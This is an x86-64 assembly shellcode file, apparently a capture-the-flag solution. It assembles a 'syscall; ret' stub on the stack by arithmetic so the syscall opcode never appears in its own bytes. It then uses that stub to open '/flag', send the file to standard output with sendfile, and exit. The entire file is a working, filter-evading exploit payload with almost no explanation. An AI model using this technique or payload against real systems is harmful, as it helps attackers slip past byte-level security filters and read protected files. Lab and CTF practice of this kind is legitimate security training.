.intel_syntax noprefix
.globl _start

.section .text
_start:

    SYSCALL_BLOCK:
        xor rbx, rbx
        push 0xc3040e
        mov rbx, rsp
        add word ptr [rbx], 0x0101
        mov rcx, rbx

    OPEN_FILE:
        xor rax, rax
        mov al,  2
        xor rdi, rdi
        lea rdi, [rip + flag_file]
        xor rsi, rsi
        mov rcx, rbx
        call rcx

    SEND_FILE:
        mov rsi, rax                    # Store the fd returned by open().
        xor rax, rax
        mov al, 40
        xor rdi, rdi
        mov dil, 0x01
        xor rdx, rdx
        xor r10, r10
        mov r10b, 0x64
        mov rcx, rbx
        call rcx
        
    EXIT:
        xor rax, rax
        mov al, 0x3C
        mov rcx, rbx
        call rcx

    flag_file: .string "/flag"
